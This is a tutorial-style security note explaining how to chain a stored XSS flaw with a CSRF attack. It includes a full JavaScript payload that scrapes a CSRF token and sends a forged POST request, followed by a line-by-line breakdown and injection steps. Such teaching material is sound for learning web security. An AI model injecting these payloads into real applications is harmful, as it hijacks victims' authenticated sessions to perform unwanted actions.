# XSS & CSRF Chaining

Chaining vulnerabilities can be a powerful technique in cybersecurity, particularly when bypassing protections like CSRF (Cross-Site Request Forgery). This note outlines a generic approach to exploit a stored XSS (Cross-Site Scripting) vulnerability to perform a CSRF attack, applicable to various web applications.

***

#### 🔍 Overview of the Technique

* **Objective**: Leverage a stored XSS vulnerability to execute a CSRF attack, even when same-origin policies are in place.
* **Key Concepts**:
  * **Stored XSS**: A vulnerability that allows an attacker to inject malicious scripts into a web application, which are then stored and executed in the context of other users.
  * **CSRF**: An attack that tricks a user into executing unwanted actions on a web application in which they are authenticated.

***

#### 🛠️ Setting Up the Attack

1. **Identify Vulnerabilities**:
   * Look for a stored XSS vulnerability in user input fields (e.g., profile fields, comments).
   * Ensure the application has CSRF protections in place, such as tokens.
2. **Craft the JavaScript Payload**:
   * Create a JavaScript payload that will be executed when the victim accesses the compromised page. The payload should:
     * Make an initial request to retrieve the CSRF token.
     * Use the token to perform a state-changing action (e.g., changing visibility settings).

***

#### 💻 Crafting the JavaScript Payload

To execute the CSRF attack, we need to create a JavaScript payload to place in the **Country** field of the target profile. Here’s the payload:

```javascript
javascriptCopy Code<script>
var req = new XMLHttpRequest();
req.onload = handleResponse;
req.open('get','/app/change-visibility',true);
req.send();
function handleResponse(d) {
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
};
</script>
```

**Breakdown of the Payload**

* **Script Tags**: The entire script is wrapped in `<script>` tags to ensure it executes as JavaScript.
*   **Creating XMLHttpRequest**:

    ```javascript
    var req = new XMLHttpRequest();
    ```

    This initializes a new XMLHttpRequest object for sending HTTP requests.
*   **Handling Response**:

    ```javascript
    req.onload = handleResponse;
    ```

    This sets up an event handler that will execute once the request is complete.
*   **Sending the Initial Request**:

    ```javascript
    req.open('get','/app/change-visibility',true);
    req.send();
    ```

    This sends a GET request to retrieve the CSRF token.
*   **Extracting the CSRF Token**:

    ```javascript
    var token = this.responseText.match(/name="csrf" type="hidden" value="(\w+)"/)[1];
    ```

    This line captures the CSRF token from the response.
*   **Constructing the Change Request**:

    ```javascript
    var changeReq = new XMLHttpRequest();
    changeReq.open('post', '/app/change-visibility', true);
    changeReq.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    changeReq.send('csrf='+token+'&action=change');
    ```

    This sends a POST request to change the visibility, including the CSRF token and action.

***

#### 🚀 Executing the Attack

1. **Inject the Payload**: Place the crafted JavaScript into the vulnerable input field (e.g., a profile field).
2. **Trigger the Payload**: The next time a victim accesses the page containing the injected script, it will execute and perform the CSRF attack.\
